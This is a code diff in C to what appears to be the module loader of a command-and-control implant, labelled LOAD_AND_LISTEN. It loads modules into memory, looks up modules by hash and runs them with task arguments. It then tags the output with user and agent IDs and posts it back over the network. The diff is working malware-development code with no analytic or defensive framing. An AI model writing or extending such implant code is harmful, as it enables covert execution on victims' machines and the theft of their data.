@@ -1,16 +1,41 @@
 #ifdef LOAD_AND_LISTEN
 #include "../../includes/core/core.h"
 #include "../../includes/core/utils.h"
+#include "../../includes/comms/comms.h"
 #include "../../includes/loader/loader.h"
 #include "../../includes/parser/parser.h"
 
 
+
+
+/*
+INPUT
+	[CODE] -> TASK_MODULE
+	[]
+
+OUTPUT
+	[MSG_TYPE] 0xaf
+	[output type]
+	[user id]
+	[agent id]
+	per output type
+	e.g for ls
+	[file len] 4 bytes
+	[file str] N bytes
+	[entry type] 4 bytes
+	[size] 4 bytes
+	[end sig]
+*/
 void ModuleWrite4(PVOID ctx, DWORD val) {
 	ParserWrite4((ParserWrite *)ctx, val);
 }
 
+void ModuleWrite8(PVOID ctx, ULONGLONG val) {
+	ParserWrite8((ParserWrite *)ctx, val);
+}
+
 void ModuleWriteStr(PVOID ctx, PCHAR str, DWORD len) {
-	ParserWriteBytes((ParserWrite *)ctx, (PBYTE)str, len);
+	ParserWriteRaw((ParserWrite *)ctx, (PBYTE)str, len);
 }
 
 HMODULE ModuleGetModule(DWORD hash) {
@@ -63,6 +88,7 @@ BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
 	mod->size              = sizeof(Module);
 	mod->Version           = 1;
 	mod->ModuleWrite4      = ModuleWrite4;
+	mod->ModuleWrite8      = ModuleWrite8;
 	mod->ModuleWriteStr    = ModuleWriteStr;
 	mod->ModuleGetModule   = ModuleGetModule;
 	mod->ModuleGetProc     = ModuleGetProc;
@@ -75,17 +101,29 @@ BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
 		return FALSE;
 	}
 
+	ParserWrite4(p, MSG_OUTPUT);
+	ParserWriteBytes(p, ldr->config->UserId, sizeof(ldr->config->UserId));
+	ParserWriteBytes(p, ldr->config->AgentId, sizeof(ldr->config->AgentId));
+	ParserWrite4(p, MSG_NEEDS_PARSE);
+
 	pModuleEntry entry = (pModuleEntry)((PBYTE)BaseAddress + pOpt->AddressOfEntryPoint);
 	DBGA("[*] Running Module\n");
-	if (!entry(mod, (PVOID)p, NULL, 0)) {
+	if (!entry(mod, (PVOID)p, (PBYTE)info.args, 0)) {
 		DBGA("[!] Module returned failure\n");
 	}
+	DBGA("[*] Module ran succesfully");
 
-	ParserClearWrite(p);
-	ldr->win32->LocalFree(mod);
+	
 
 	SIZE_T size = 0;
 	ldr->win32->NtFreeVirtualMemory(CurrentProcess(), &BaseAddress, &size, MEM_RELEASE);
+	if(info.args) {
+		ldr->win32->LocalFree(info.args);
+	}
+
+	NwPostOutput(ParserWriteReturnPointer(p), ParserWriteReturnSize(p));
+	ParserClearWrite(p);
+	ldr->win32->LocalFree(mod);
 
 
 	return TRUE;
